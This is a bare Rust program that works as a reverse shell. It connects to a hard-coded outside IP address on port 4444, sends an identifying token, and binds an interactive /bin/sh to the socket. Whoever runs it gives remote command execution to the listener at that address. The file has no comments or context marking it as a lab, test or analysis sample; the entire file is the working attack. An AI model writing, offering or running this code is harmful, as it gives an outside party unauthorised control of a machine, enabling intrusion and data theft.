use std::io::Write;
use std::net::TcpStream;
use std::os::fd::OwnedFd;
use std::process::{Command, Stdio};

fn main() {
    let mut stream = match TcpStream::connect(("150.241.115.45", 4444)) {
        Ok(stream) => stream,
        Err(_) => return,
    };
    let _ = stream.write_all(b"2ea5f9a440c12a4583866d1e02bbb3a0\n");

    let stdin = match stream.try_clone() {
        Ok(stream) => stream,
        Err(_) => return,
    };
    let stdout = match stream.try_clone() {
        Ok(stream) => stream,
        Err(_) => return,
    };

    if let Ok(mut child) = Command::new("/bin/sh")
        .arg("-i")
        .stdin(Stdio::from(OwnedFd::from(stdin)))
        .stdout(Stdio::from(OwnedFd::from(stdout)))
        .stderr(Stdio::from(OwnedFd::from(stream)))
        .spawn()
    {
        let _ = child.wait();
    }
}
